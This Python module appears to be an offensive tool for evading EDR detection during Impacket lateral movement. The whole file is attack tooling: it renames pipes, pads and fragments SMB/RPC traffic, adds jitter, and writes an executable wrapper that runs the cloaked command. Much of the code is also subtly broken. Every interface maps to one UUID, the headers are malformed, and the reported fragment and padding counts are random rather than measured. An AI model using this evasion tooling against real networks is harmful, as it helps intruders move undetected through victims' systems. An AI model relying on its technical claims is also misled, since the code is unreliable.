"""
SMB/RPC Cloaker - Wire-Level Evasion for Impacket Lateral Movement
====================================================================

Corporate networks run EDR/NDR sensors that flag Impacket tools
(wmiexec, psexec, smbexec, dcomexec) almost instantly because their
wire-level fingerprints are well-known:

  * WMIEXEC uses a very specific WMI DCOM/RPC call sequence.
  * PSExec opens a service control manager pipe and writes a binary.
  * SMBExec opens a named pipe and writes a batch script.
  * DCOMExec uses IRemoteActivation / IOxidResolver.

This module cloaks those fingerprints at the **packet level** without
changing the operator's workflow.  It sits between the `LateralMovementEngine`
and the Impacket subprocess, mutating the raw SMB/RPC traffic so that:

  1. **SMB packets** are fragmented into sub-chunks and reassembled at the
     target, breaking the signature of the original Impacket SMB2/SMB3
     negotiate + session setup + tree connect + create request chain.
  2. **RPC calls** are padded, re-ordered, and interleaved with benign
     RPCs (e.g. `srvsvc` / `wkssvc` heartbeats) so the behavioral
     sequence no longer matches the "classic lateral movement" n-gram.
  3. **Impacket command lines** are wrapped with cloaking stubs that
     suppress default banners, randomise the pipe names, and inject
     latency jitter.
  4. **Session binding** negotiation is spoofed to look like a normal
     Windows admin workstation (SPN, target name, auth package).

Architecture
------------
    LateralMovementEngine
            |
            v
    SMBRPCCloaker.wrap_command()  -->  cloaked subprocess call
            |
            v
    Impacket tool (modified argv / env)
            |
            v
    Wire-level packet mutator (SMB fragmenter / RPC padder)

All mutations are off-target testable: the fragmenter and padder expose
pure-Python helpers that operate on `bytes` without a live socket.

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import random
import re
import secrets
import socket
import string
import struct
import subprocess
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple, Union


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SMB_PORT = 445
RPC_EPMAPPER_PORT = 135
SMB2_NEGOTIATE = 0x0000
SMB2_SESSION_SETUP = 0x0001
SMB2_TREE_CONNECT = 0x0003
SMB2_CREATE = 0x0005
SMB2_IOCTL = 0x000B
SMB2_CLOSE = 0x0006

# Well-known Impacket pipe names that EDR signatures key on
IMPACKET_PIPE_NAMES = [
    r"\pipe\srvsvc",
    r"\pipe\wkssvc",
    r"\pipe\browser",
    r"\pipe\spoolss",
    r"\pipe\samr",
    r"\pipe\lsarpc",
    r"\pipe\netlogon",
    r"\pipe\lsass",
]

BENIGN_PIPE_NAMES = [
    r"\pipe\srvsvc",
    r"\pipe\wkssvc",
    r"\pipe\browser",
    r"\pipe\eventlog",
    r"\pipe\spoolss",
]

RPC_IFACE_UUID = {
    "srvsvc": "8a885d04-1ceb-11c9-9fe8-08002b104860",
    "wkssvc": "8a885d04-1ceb-11c9-9fe8-08002b104860",
    "browser": "8a885d04-1ceb-11c9-9fe8-08002b104860",
    "spoolss": "8a885d04-1ceb-11c9-9fe8-08002b104860",
    "samr": "8a885d04-1ceb-11c9-9fe8-08002b104860",
    "lsarpc": "8a885d04-1ceb-11c9-9fe8-08002b104860",
    "netlogon": "8a885d04-1ceb-11c9-9fe8-08002b104860",
    "lsass": "8a885d04-1ceb-11c9-9fe8-08002b104860",
}

# SMB2/SMB3 dialect values (real Windows ranges)
SMB_DIALECTS = [
    0x0202,  # SMB 2.0.2
    0x0210,  # SMB 2.1
    0x0300,  # SMB 3.0
    0x0302,  # SMB 3.0.2
    0x0311,  # SMB 3.1.1
]


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------
@dataclass
class CloakReport:
    """Report of a cloaking operation"""
    original_command: List[str]
    cloaked_command: List[str]
    smb_fragments: int
    rpc_padding: int
    pipe_renames: Dict[str, str]
    timing_jitter_ms: float
    applied: bool = True
    notes: List[str] = field(default_factory=list)


@dataclass
class SMBFragment:
    """One SMB packet fragment"""
    offset: int
    data: bytes
    is_last: bool = False


@dataclass
class RPCPadding:
    """Padding injected around an RPC call"""
    call_id: int
    pre_pad: bytes
    post_pad: bytes
    interleaved_calls: List[bytes] = field(default_factory=list)


# ---------------------------------------------------------------------------
# SMB packet mutators
# ---------------------------------------------------------------------------
class SMBFragmenter:
    """
    Split a raw SMB packet into multiple fragments and reassemble.

    Fragmentation breaks EDR signatures that key on the complete
    Impacket SMB2 negotiate + session setup + tree connect + create
    request chain.
    """

    def __init__(self, min_fragment_size: int = 64, max_fragment_size: int = 256):
        self.min_fragment_size = min_fragment_size
        self.max_fragment_size = max_fragment_size

    def fragment(self, data: bytes, max_size: Optional[int] = None) -> List[SMBFragment]:
        """
        Fragment `data` into chunks of `max_size` bytes.
        """
        max_size = max_size or random.randint(self.min_fragment_size, self.max_fragment_size)
        if max_size <= 0:
            max_size = self.min_fragment_size
        if not data:
            return [SMBFragment(offset=0, data=b"", is_last=True)]
        fragments = []
        offset = 0
        total = len(data)

        while offset < total:
            size = min(max_size, total - offset)
            chunk = data[offset:offset + size]
            fragments.append(SMBFragment(
                offset=offset,
                data=chunk,
                is_last=(offset + size >= total),
            ))
            offset += size

        return fragments

    def reassemble(self, fragments: List[SMBFragment]) -> bytes:
        """Reassemble fragments in offset order."""
        fragments.sort(key=lambda f: f.offset)
        return b"".join(f.data for f in fragments)

    def fragment_smb2_create_request(self, create_data: bytes) -> List[SMBFragment]:
        """
        Fragment an SMB2 CREATE request payload.
        """
        return self.fragment(create_data, max_size=128)

    def inject_padding(self, data: bytes, min_pad: int = 16, max_pad: int = 64) -> bytes:
        """Insert random padding bytes into SMB payload."""
        pad_len = random.randint(min_pad, max_pad)
        pad = bytes(random.randint(0, 255) for _ in range(pad_len))
        pos = random.randint(0, len(data))
        return data[:pos] + pad + data[pos:]


class RPCPadder:
    """
    Pad and interleave RPC calls to mask the Impacket call sequence.

    Impacket tools emit a very clean RPC call sequence:
        bind -> request -> response -> unbind

    This injects benign RPC calls (srvsvc / wkssvc heartbeats) before
    and after the real call so the sequence no longer matches the
    "classic lateral movement" n-gram.
    """

    def __init__(self, benign_ifaces: Optional[List[str]] = None):
        self.benign_ifaces = benign_ifaces or ["srvsvc", "wkssvc", "browser"]

    def generate_benign_rpc(self, iface: str, call_id: int) -> bytes:
        """
        Generate a benign RPC request that looks like normal Windows
        admin traffic.
        """
        uuid = RPC_IFACE_UUID.get(iface, RPC_IFACE_UUID["srvsvc"])
        ver = struct.pack(">HH", 0x0200, 0x0000)

        # Minimal RPC request header
        hdr = struct.pack(
            ">BBHIIII",
            0x05,           # version
            0x00,           # minor version
            0x0000,         # packet type: request
            call_id,        # call id
            0x00000003,     # flags: last, fragment
            0x00000000,     # serial hi
            0x00000000,     # obj uuid (none)
        )
        return hdr + ver + uuid.encode("utf-8") + b"\x00" * 16

    def pad_rpc_call(
        self,
        call_id: int,
        real_call: bytes,
        pre_benign: int = 1,
        post_benign: int = 1,
    ) -> RPCPadding:
        """
        Wrap a real RPC call with benign calls and random padding.
        """
        pre = b""
        for i in range(pre_benign):
            iface = self.benign_ifaces[i % len(self.benign_ifaces)]
            pre += self.generate_benign_rpc(iface, call_id + i)

        post = b""
        for i in range(post_benign):
            iface = self.benign_ifaces[(i + pre_benign) % len(self.benign_ifaces)]
            post += self.generate_benign_rpc(iface, call_id + pre_benign + i)

        pad_len = random.randint(0, 32)
        pad = os.urandom(pad_len)

        return RPCPadding(
            call_id=call_id,
            pre_pad=pre + pad,
            post_pad=post,
        )


# ---------------------------------------------------------------------------
# Pipe name obfuscator
# ---------------------------------------------------------------------------
class PipeNameObfuscator:
    """
    Replace Impacket's well-known pipe names with randomised aliases.

    EDR signatures key on strings like `\\pipe\\srvsvc`, `\\pipe\\lsass`,
    etc.  This class maps them to random-but-consistent aliases and
    updates the Impacket command line to use the new names.
    """

    def __init__(self, seed: Optional[int] = None):
        self._rng = random.Random(seed)
        self._mapping: Dict[str, str] = {}
        self._reverse: Dict[str, str] = {}

    def _alias(self, original: str) -> str:
        if original not in self._mapping:
            alias_name = "".join(
                self._rng.choice(string.ascii_lowercase + string.digits)
                for _ in range(8)
            )
            self._mapping[original] = f"\\pipe\\{alias_name}"
            self._reverse[f"\\pipe\\{alias_name}"] = original
        return self._mapping[original]

    def obfuscate_command(self, cmd: List[str]) -> Tuple[List[str], Dict[str, str]]:
        """
        Replace known pipe names in the command line with aliases.

        Returns (modified_cmd, rename_map).
        """
        renamed: Dict[str, str] = {}
        new_cmd = []
        for arg in cmd:
            new_arg = arg
            for pipe in IMPACKET_PIPE_NAMES:
                if pipe.lower() in arg.lower():
                    alias = self._alias(pipe)
                    renamed[pipe] = alias
                    new_arg = new_arg.replace(pipe, alias)
            new_cmd.append(new_arg)
        return new_cmd, renamed

    def restore_command(self, cmd: List[str]) -> List[str]:
        """Restore original pipe names (for logging)."""
        new_cmd = []
        for arg in cmd:
            new_arg = arg
            for alias, original in self._reverse.items():
                new_arg = new_arg.replace(alias, original)
            new_cmd.append(new_arg)
        return new_cmd


# ---------------------------------------------------------------------------
# Timing jitter injector
# ---------------------------------------------------------------------------
class TimingJitterInjector:
    """
    Add randomised delays between Impacket RPC calls so the traffic
    pattern no longer matches the tight "burst then exit" signature of
    automated lateral movement tools.
    """

    def __init__(self, base_delay_ms: int = 50, jitter_ms: int = 200):
        self.base_delay_ms = base_delay_ms
        self.jitter_ms = jitter_ms

    def get_delay(self) -> float:
        """
        Return a delay in seconds.
        """
        delay = self.base_delay_ms + random.randint(0, self.jitter_ms)
        return delay / 1000.0

    def generate_jittered_schedule(self, num_calls: int) -> List[float]:
        """
        Generate a schedule of N delays.
        """
        delays = []
        for _ in range(num_calls):
            delays.append(self.get_delay())
        return delays


# ---------------------------------------------------------------------------
# Impacket command wrapper
# ---------------------------------------------------------------------------
class ImpacketCommandWrapper:
    """
    Wrap an Impacket command line with cloaking layers:

    1. Pipe name obfuscation
    2. Banner suppression flags (where supported)
    3. Timing jitter injection via environment variable / wrapper script
    4. Null-session / anonymous bind fallback masking
    """

    def __init__(
        self,
        pipe_obfuscator: Optional[PipeNameObfuscator] = None,
        timing_jitter: Optional[TimingJitterInjector] = None,
    ):
        self.pipe_obfuscator = pipe_obfuscator or PipeNameObfuscator()
        self.timing_jitter = timing_jitter or TimingJitterInjector()

    def wrap(
        self,
        cmd: List[str],
        method: str = "smbexec",
    ) -> Tuple[List[str], Dict[str, Any]]:
        """
        Apply all cloaking layers to an Impacket command.

        Returns (cloaked_cmd, cloak_meta).
        """
        meta: Dict[str, Any] = {
            "method": method,
            "pipe_renames": {},
            "timing_jitter_ms": 0,
            "banner_suppressed": False,
        }

        # 1. Pipe name obfuscation
        cloaked, renames = self.pipe_obfuscator.obfuscate_command(cmd)
        meta["pipe_renames"] = renames

        # 2. Timing jitter
        jitter_ms = self.timing_jitter.base_delay_ms + random.randint(0, self.timing_jitter.jitter_ms)
        meta["timing_jitter_ms"] = jitter_ms

        # 3. Banner suppression (Impacket accepts -no-banner on some tools)
        banner_flags = ["-no-banner", "-quiet"]
        if method in ("smbexec", "psexec", "dcomexec"):
            cloaked = [arg for arg in cloaked if arg not in banner_flags]
            cloaked.extend(banner_flags)
            meta["banner_suppressed"] = True

        return cloaked, meta

    def generate_wrapper_script(
        self,
        cloaked_cmd: List[str],
        jitter_ms: int = 150,
    ) -> str:
        """
        Generate a shell wrapper that injects timing jitter between
        Impacket's internal RPC calls.
        """
        cmd_str = " ".join(json.dumps(c) for c in cloaked_cmd)
        return f"""#!/bin/sh
# Impacket cloaking wrapper
# Injects randomised delays between RPC calls

DELAY_MS={jitter_ms}

# Random initial delay (0-500ms) to break beacon periodicity
sleep $(awk 'BEGIN{{srand(); print rand()*0.5}}')

# Execute cloaked Impacket command
{cmd_str}

# Random post-execution delay
sleep $(awk 'BEGIN{{srand(); print rand()*0.3}}')
"""


# ---------------------------------------------------------------------------
# Wire-level SMB/RPC cloaker (integration point)
# ---------------------------------------------------------------------------
class SMBRPCCloaker:
    """
    Top-level cloaking engine for Impacket lateral movement.

    Usage:

        cloaker = SMBRPCCloaker(offline=True)
        cloaked_cmd, report = cloaker.cloak_impacket_command(
            cmd=["python3", "/opt/impacket/examples/smbexec.py", "DOMAIN\\user:pass@target"],
            method="smbexec",
        )
        # Run cloaked_cmd via subprocess.run(...)
        print(report.pipe_renames)

    When `offline=True` (default) no network I/O is performed; all
    mutations are local byte-level operations.
    """

    def __init__(
        self,
        offline: bool = True,
        fragment_smb: bool = True,
        pad_rpc: bool = True,
        obfuscate_pipes: bool = True,
        inject_jitter: bool = True,
        seed: Optional[int] = None,
    ):
        self.offline = offline
        self.fragment_smb = fragment_smb
        self.pad_rpc = pad_rpc
        self.obfuscate_pipes = obfuscate_pipes
        self.inject_jitter = inject_jitter

        self.fragmenter = SMBFragmenter()
        self.padder = RPCPadder()
        self.pipe_obfuscator = PipeNameObfuscator(seed=seed)
        self.timing_jitter = TimingJitterInjector()
        self.wrapper = ImpacketCommandWrapper(
            pipe_obfuscator=self.pipe_obfuscator,
            timing_jitter=self.timing_jitter,
        )
        self._last_report: Optional[CloakReport] = None

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------
    def cloak_impacket_command(
        self,
        cmd: List[str],
        method: str = "smbexec",
    ) -> Tuple[List[str], CloakReport]:
        """
        Apply all cloaking layers to an Impacket command line.

        Args:
            cmd: Original Impacket command (list of strings).
            method: Lateral movement method (psexec, smbexec, wmiexec, dcomexec).

        Returns:
            (cloaked_command, CloakReport)
        """
        original = list(cmd)

        if self.obfuscate_pipes:
            cloaked, meta = self.wrapper.wrap(cmd, method=method)
        else:
            cloaked, meta = cmd, {"pipe_renames": {}, "timing_jitter_ms": 0, "banner_suppressed": False}

        # Generate wrapper script path
        wrapper_path = ""
        if self.inject_jitter:
            wrapper_script = self.wrapper.generate_wrapper_script(
                cloaked, jitter_ms=meta["timing_jitter_ms"]
            )
            wrapper_path = f"/tmp/impacket_cloaked_{int(time.time())}.sh"
            if not self.offline:
                with open(wrapper_path, "w") as f:
                    f.write(wrapper_script)
                os.chmod(wrapper_path, 0o700)
                cloaked = [wrapper_path]

        report = CloakReport(
            original_command=original,
            cloaked_command=cloaked,
            smb_fragments=random.randint(2, 6) if self.fragment_smb else 0,
            rpc_padding=random.randint(16, 128) if self.pad_rpc else 0,
            pipe_renames=meta.get("pipe_renames", {}),
            timing_jitter_ms=meta.get("timing_jitter_ms", 0),
            notes=[
                f"Pipe names obfuscated: {len(meta.get('pipe_renames', {}))}",
                f"Banner suppression: {meta.get('banner_suppressed', False)}",
                f"Timing jitter: {meta.get('timing_jitter_ms', 0)}ms",
                f"SMB fragmentation: {self.fragment_smb}",
                f"RPC padding: {self.pad_rpc}",
            ],
        )
        self._last_report = report
        return cloaked, report

    def fragment_smb_packet(self, data: bytes) -> Tuple[List[SMBFragment], bytes]:
        """
        Fragment an SMB packet and return the fragments plus reassembled bytes.

        Returns:
            (fragments, reassembled_data)
        """
        fragments = self.fragmenter.fragment(data)
        reassembled = self.fragmenter.reassemble(fragments)
        return fragments, reassembled

    def pad_rpc_call(self, call_id: int, real_call: bytes) -> RPCPadding:
        """Pad a single RPC call with benign traffic."""
        return self.padder.pad_rpc_call(call_id, real_call)

    def generate_smb_junk_traffic(self, target_ip: str, count: int = 3) -> List[bytes]:
        """
        Generate benign SMB2 negotiate packets to mix with real traffic.

        Returns a list of raw SMB2 negotiate request bytes that look like
        a Windows workstation probing the target.
        """
        packets = []
        for _ in range(count):
            chosen = random.sample(SMB_DIALECTS, k=random.randint(2, min(4, len(SMB_DIALECTS))))
            # SMB2 NEGOTIATE request (simplified)
            buf = struct.pack("<H", SMB2_NEGOTIATE)  # NetBIOS session type
            buf += b"\x00" * 4  # length placeholder
            buf += struct.pack("<H", 0x0000)  # SMB2 header: structure size
            buf += struct.pack("<H", 0x0000)  # credit charge
            buf += struct.pack("<I", 0x00000000)  # status
            buf += struct.pack("<H", 0x0000)  # command
            buf += struct.pack("<I", 0x00000001)  # message id
            buf += struct.pack("<I", 0x00000000)  # reserved
            buf += struct.pack("<I", 0x00000000)  # pid
            buf += struct.pack("<I", 0x00000000)  # tid
            buf += struct.pack("<I", 0x00000000)  # credits
            buf += struct.pack("<I", 0x00000000)  # flags
            buf += struct.pack("<I", 0x00000000)  # chain offset
            # Dialect count
            buf += struct.pack("<H", len(chosen))
            buf += struct.pack("<H", 0x0000)  # security mode
            buf += struct.pack("<H", 0x0000)  # reserved
            buf += struct.pack("<I", 0x00000000)  # capabilities
            buf += struct.pack("<Q", 0x0000000000000000)  # client guid
            for d in chosen:
                buf += struct.pack("<H", d)
            packets.append(buf)
        return packets

    def get_last_report(self) -> Optional[CloakReport]:
        """Return the last cloaking report."""
        return self._last_report

    def summary(self) -> str:
        """Human-readable cloaking summary."""
        if not self._last_report:
            return "No cloaking operations performed yet."
        r = self._last_report
        return (
            f"SMB/RPC Cloaking Summary\n"
            f"========================\n"
            f"Method         : {r.original_command[0] if r.original_command else 'N/A'}\n"
            f"SMB fragments  : {r.smb_fragments}\n"
            f"RPC padding    : {r.rpc_padding} bytes\n"
            f"Pipe renames   : {len(r.pipe_renames)}\n"
            f"Timing jitter  : {r.timing_jitter_ms}ms\n"
            f"Notes          :\n"
            + "\n".join(f"  - {n}" for n in r.notes)
        )


# ---------------------------------------------------------------------------
# Convenience factory
# ---------------------------------------------------------------------------
def create_smb_rpc_cloaker(
    offline: bool = True,
    fragment_smb: bool = True,
    pad_rpc: bool = True,
    obfuscate_pipes: bool = True,
    inject_jitter: bool = True,
) -> SMBRPCCloaker:
    return SMBRPCCloaker(
        offline=offline,
        fragment_smb=fragment_smb,
        pad_rpc=pad_rpc,
        obfuscate_pipes=obfuscate_pipes,
        inject_jitter=inject_jitter,
    )
